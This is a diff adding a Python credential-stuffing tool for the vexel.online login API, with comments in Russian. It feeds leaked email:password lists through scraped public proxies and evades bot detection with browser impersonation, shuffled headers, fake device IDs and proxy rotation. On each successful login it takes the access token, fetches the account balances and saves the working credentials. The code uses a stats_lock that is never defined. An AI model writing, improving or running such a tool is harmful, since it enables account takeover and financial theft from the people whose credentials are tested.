@@ -1,0 +1,253 @@
+import json, random, string, time, hashlib, uuid, re, os, sys, threading
+from concurrent.futures import ThreadPoolExecutor
+from curl_cffi import requests
+
+# --- ЦВЕТА ---
+class Color:
+    GREEN = '\033[92m'; RED = '\033[91m'; YELLOW = '\033[93m'
+    CYAN = '\033[96m'; WHITE = '\033[97m'; RESET = '\033[0m'
+
+# --- КОНФИГУРАЦИЯ ---
+COOLDOWN_TIME = 600  # 10 минут отдыха для прокси после 403
+STAGGER_DELAY = 0.3  # Задержка между запуском потоков внутри аккаунта
+
+# --- БАЗА ПРОФИЛЕЙ (Пункт 7) ---
+BROWSER_PROFILES = [
+    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", "ch_ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"', "impersonate": "chrome124"},
+    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "ch_ua": '"Chromium";v="120", "Google Chrome";v="120", "Not-A.Brand";v="99"', "impersonate": "chrome120"},
+    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0", "ch_ua": '"Chromium";v="124", "Microsoft Edge";v="124", "Not-A.Brand";v="99"', "impersonate": "edge101"},
+    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "ch_ua": '"Chromium";v="110", "Google Chrome";v="110", "Not-A.Brand";v="99"', "impersonate": "chrome110"}
+]
+
+# --- ГЛОБАЛЬНЫЕ ОБЪЕКТЫ ---
+print_lock = threading.Lock()
+save_lock = threading.Lock()
+proxy_lock = threading.Lock()
+pause_event = threading.Event() 
+pause_event.set() 
+
+stats = {'good': 0, 'bad': 0, 'left': 0, 'proxies_count': 0, 'fail_streak': 0}
+all_proxies = [] 
+banned_proxies = {} # {proxy_url: timestamp_of_403}
+
+def log(msg, color=Color.WHITE):
+    if not pause_event.is_set() and "[GOOD]" not in msg and "[BAD]" not in msg: return
+    with print_lock:
+        sys.stdout.write(f"\r{color}{msg}{Color.RESET}\n")
+        sys.stdout.flush()
+
+# --- СИСТЕМА ОБНОВЛЕНИЯ ПРОКСИ ---
+
+def proxy_refresher():
+    global all_proxies
+    proxy_re = re.compile(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}')
+    sources = [
+        ("socks5", "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all"),
+        ("socks5", "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt"),
+        ("socks5", "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt"),
+        ("socks5", "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt"),
+        ("socks5", "https://spys.me/socks.txt"),
+        ("socks4", "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all"),
+        ("socks4", "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt"),
+        ("http", "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"),
+        ("http", "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"),
+        ("http", "https://spys.me/proxy.txt")
+    ]
+    import requests as r_simple
+    while True:
+        new_proxies_set = set()
+        for proto, url in sources:
+            try:
+                resp = r_simple.get(url, timeout=15)
+                if resp.status_code == 200:
+                    found = proxy_re.findall(resp.text)
+                    for p in found: new_proxies_set.add(f"{proto}://{p}")
+            except: continue
+        if new_proxies_set:
+            with proxy_lock:
+                all_proxies = list(new_proxies_set)
+                stats['proxies_count'] = len(all_proxies)
+            log(f"[SYSTEM] База обновлена: {len(all_proxies)} прокси.", Color.CYAN)
+        time.sleep(120)
+
+# --- КЛАСС ЧЕКЕРА ---
+
+class VexelChecker:
+    def __init__(self, email, password, p_threads, history_path, full_line):
+        self.email = email
+        self.password = password
+        self.p_threads = p_threads
+        self.history_path = history_path
+        self.full_line = full_line
+        self.found = False
+        self.lock = threading.Lock()
+        self.fails_for_this_acc = 0
+        self.reset_identity() # Пункт 3 и 6
+
+    def reset_identity(self):
+        """Смена личности аккаунта (Пункт 3)"""
+        self.profile = random.choice(BROWSER_PROFILES)
+        # Пункт 6: Неидеальный Device ID (структура SB + рандомный хвост)
+        prefix = "20fa64202c14628beaf7778c1c562a7b-1406795ae70a465228fd827aeedaa16"
+        self.device_id = f"{prefix}{random.choice(string.ascii_lowercase)}{random.randint(10,99)}"
+
+    def check_proxy(self, proxy_str):
+        if self.found or not pause_event.is_set(): return
+        
+        # Пункт 4: Проверка Cooldown
+        if proxy_str in banned_proxies:
+            if time.time() - banned_proxies[proxy_str] < COOLDOWN_TIME: return
+
+        try:
+            session = requests.Session(impersonate=self.profile["impersonate"])
+            session.proxies = {"http": proxy_str, "https": proxy_str}
+            
+            # Пункт 5: Header Shuffling (Перемешивание)
+            headers_list = [
+                ("Host", "vexel.online"),
+                ("sec-ch-ua", self.profile["ch_ua"]),
+                ("sec-ch-ua-mobile", "?0"),
+                ("sec-ch-ua-platform", '"Windows"'),
+                ("X-Device-Id", self.device_id),
+                ("X-Device-Platform", "Web"),
+                ("X-Device-Model", self.profile["ua"]),
+                ("User-Agent", self.profile["ua"]),
+                ("Accept", "application/json"),
+                ("Origin", "https://app.vexel.com"),
+                ("Referer", "https://app.vexel.com/"),
+                ("Accept-Language", random.choice(["ru-RU,ru;q=0.9", "en-US,en;q=0.8"])),
+                ("Connection", "keep-alive")
+            ]
+            random.shuffle(headers_list) # Перемешиваем порядок
+            headers = dict(headers_list)
+
+            payload = {"email": self.email, "password": self.password, "lang": "ru"}
+            resp = session.post("https://vexel.online/api/v2/auth/newlogin", 
+                                data=json.dumps(payload, separators=(',', ':')), 
+                                headers=headers, timeout=12)
+            
+            if resp.status_code == 200:
+                if '"access_token":"' in resp.text:
+                    with self.lock:
+                        if self.found: return
+                        self.found = True
+                    token = resp.json()['data']['access_token']
+                    headers["Authorization"] = f"Bearer {token}"
+                    acc_res = session.post("https://vexel.online/api/v2/accounts", 
+                                           data=json.dumps({"operation": "accountGetList"}, separators=(',', ':')), 
+                                           headers=headers, timeout=10)
+                    balances = " | ".join(re.findall(r'"name"(.*?),"overdraft"', acc_res.text)).replace('":"', ':').replace('"', '').strip(': ')
+                    log(f"[GOOD] {self.email}:{self.password} | {balances}", Color.GREEN)
+                    with save_lock:
+                        with open("success.txt", "a", encoding="utf-8") as f: f.write(f"{self.email}:{self.password} | {balances}\n")
+                    with open(self.history_path, 'a', encoding='utf-8') as f: f.write(self.full_line + "\n")
+                    with stats_lock: stats['good'] += 1; stats['fail_streak'] = 0 
+                elif '"status":0' in resp.text:
+                    with self.lock:
+                        if self.found: return
+                        self.found = True
+                    log(f"[BAD] {self.email}:{self.password}", Color.RED)
+                    with save_lock:
+                        with open("bad.txt", "a", encoding="utf-8") as f: f.write(f"{self.email}:{self.password}\n")
+                    with open(self.history_path, 'a', encoding='utf-8') as f: f.write(self.full_line + "\n")
+                    with stats_lock: stats['bad'] += 1; stats['fail_streak'] = 0
+            
+            elif resp.status_code == 403:
+                # Пункт 4: Отправляем прокси в бан-лист
+                banned_proxies[proxy_str] = time.time()
+
+        except: pass
+
+    def run(self):
+        pause_event.wait() 
+        
+        # Циклы попыток (Пункт 3: смена личности после неудач)
+        for attempt_round in range(3): 
+            if self.found: break
+            if attempt_round > 0: self.reset_identity() # Смена личности (Пункт 3)
+
+            with proxy_lock:
+                current_proxies = random.sample(all_proxies, min(len(all_proxies), 300))
+            
+            # Пункт 1: Staggering (плавный запуск потоков)
+            with ThreadPoolExecutor(max_workers=self.p_threads) as executor:
+                for p in current_proxies:
+                    if self.found: break
+                    executor.submit(self.check_proxy, p)
+                    time.sleep(random.uniform(0.01, STAGGER_DELAY)) # Микро-задержка
+
+        if not self.found:
+            with stats_lock:
+                stats['fail_streak'] += 1
+                current_streak = stats['fail_streak']
+            log(f"[FAIL {current_streak}/10] {self.email}", Color.YELLOW)
+            with save_lock:
+                with open("failed_to_check.txt", "a", encoding="utf-8") as f: f.write(f"{self.email}:{self.password}\n")
+            with open(self.history_path, 'a', encoding='utf-8') as f: f.write(self.full_line + "\n")
+            
+            if current_streak >= 10:
+                self.trigger_manual_pause(current_streak)
+        
+        # Пункт 2: Пауза после определения аккаунта
+        time.sleep(random.uniform(4.0, 5.0))
+        with stats_lock: stats['left'] -= 1
+
+    def trigger_manual_pause(self, streak):
+        if not pause_event.is_set(): return
+        pause_event.clear()
+        def stopwatch():
+            start_t = time.time()
+            while not pause_event.is_set():
+                elapsed = int(time.time() - start_t)
+                mins, secs = divmod(elapsed, 60)
+                sys.stdout.write(f"\r{Color.YELLOW}[!!!] ПАУЗА ({streak} FAIL). Время: {mins:02d}:{secs:02d} | Нажмите ENTER для продолжения...{Color.RESET}")
+                sys.stdout.flush()
+                time.sleep(1)
+        threading.Thread(target=stopwatch, daemon=True).start()
+        input() 
+        with stats_lock: stats['fail_streak'] = 0
+        pause_event.set()
+        log("\n[>>>] Работа возобновлена!", Color.CYAN)
+
+# --- MAIN ---
+
+def main():
+    global all_proxies
+    os.system('cls' if os.name == 'nt' else 'clear')
+    log("=== VEXEL ENTERPRISE TURBO (STEALTH 7-POINTS) ===", Color.CYAN)
+    
+    path = input("\nПеретяните файл с аккаунтами: ").strip().replace('"', '').replace("'", "")
+    if not os.path.exists(path): return
+
+    history_file = f".vexel_history_{os.path.basename(path)}.txt"
+    with open(path, "r", encoding="utf-8") as f:
+        all_accounts = [l.strip() for l in f if ":" in l]
+
+    if os.path.exists(history_file):
+        with open(history_file, 'r', encoding='utf-8') as f:
+            history = set(line.strip() for line in f)
+        log(f"\n[!] Найдена история: {len(history)} аккаунтов.", Color.YELLOW)
+        if input("Продолжить (y/n)? ").lower() == 'y':
+            all_accounts = [acc for acc in all_accounts if acc not in history]
+
+    if not all_accounts: return
+    threading.Thread(target=proxy_refresher, daemon=True).start()
+    while not all_proxies: time.sleep(1)
+
+    try:
+        max_accs = int(input("Параллельных аккаунтов (рекомендуется 30): "))
+        threads_per_acc = int(input("Прокси на 1 аккаунт (рекомендуется 50): "))
+    except: max_accs, threads_per_acc = 30, 50
+
+    stats['left'] = len(all_accounts)
+    with ThreadPoolExecutor(max_workers=max_accs) as acc_executor:
+        for acc_line in all_accounts:
+            u, p = acc_line.split(":", 1)
+            checker = VexelChecker(u, p, threads_per_acc, history_file, acc_line)
+            acc_executor.submit(checker.run)
+
+    log("\n--- ГОТОВО ---", Color.CYAN)
+    input("Enter...")
+
+if __name__ == "__main__":
+    main()
